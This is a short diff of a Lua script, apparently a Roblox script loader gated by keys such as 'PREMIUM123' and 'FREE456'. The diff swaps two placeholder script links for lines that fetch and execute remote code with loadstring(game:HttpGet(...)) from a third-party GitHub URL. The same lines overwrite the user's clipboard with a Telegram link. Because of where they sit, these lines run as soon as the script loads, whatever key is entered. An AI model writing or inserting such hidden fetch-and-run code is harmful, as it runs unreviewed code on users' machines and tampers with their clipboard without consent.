@@ -85,12 +85,12 @@ Status.TextSize = 14
 -- Список валидных ключей и их скриптов
 local keyScripts = {
     ["PREMIUM123"] = {
-        scriptLink = "https://raw.githubusercontent.com/example/premium-script.lua",
+        scriptLink = loadstring(game:HttpGet("https://raw.githubusercontent.com/WAVA094/WAVA094/refs/heads/main/New%20key", true))(setclipboard("https://t.me/qlnscrpt")),
         message = "Premium script loaded!",
         color = Color3.fromRGB(100, 255, 100)
     },
     ["FREE456"] = {
-        scriptLink = "https://raw.githubusercontent.com/example/free-script.lua",
+        scriptLink = loadstring(game:HttpGet("https://raw.githubusercontent.com/WAVA094/WAVA094/refs/heads/main/New%20key", true))(setclipboard("https://t.me/qlnscrpt")),
         message = "Free script loaded!",
         color = Color3.fromRGB(100, 200, 255)
     },
